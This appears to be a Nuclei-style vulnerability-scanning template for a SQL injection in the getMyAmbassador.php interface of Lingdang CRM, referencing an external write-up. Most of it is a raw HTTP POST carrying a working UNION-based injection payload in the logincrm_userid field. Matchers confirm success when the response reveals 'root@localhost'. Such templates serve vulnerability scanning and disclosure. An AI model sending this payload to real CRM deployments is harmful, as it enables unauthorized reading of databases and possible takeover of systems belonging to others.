id: ldcrm-getmyambassador-sqli

info:
  name: Lingdang CRM getMyAmbassador.php - SQL Injection
  author: qwtd
  severity: high
  description: |
    灵当CRM系统接口getMyAmbassador.php存在SQL注入漏洞，攻击者可利用该漏洞获取系统敏感信息，甚至控制整个数据库。
  reference:
    - https://mp.weixin.qq.com/s/Ag-KF2tbhmaTwyhy5Ph2jQ
  tags: 灵当CRM

http:
  - raw:
      - |
        POST /crm/WeiXinApp/marketing/index.php?module=Ambassador&action=getMyAmbassador HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Content-Type: application/x-www-form-urlencoded
        Connection: close

        logincrm_userid=-1 union select user(),2,3#
      
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "root@localhost"

      - type: status
        status:
          - 200
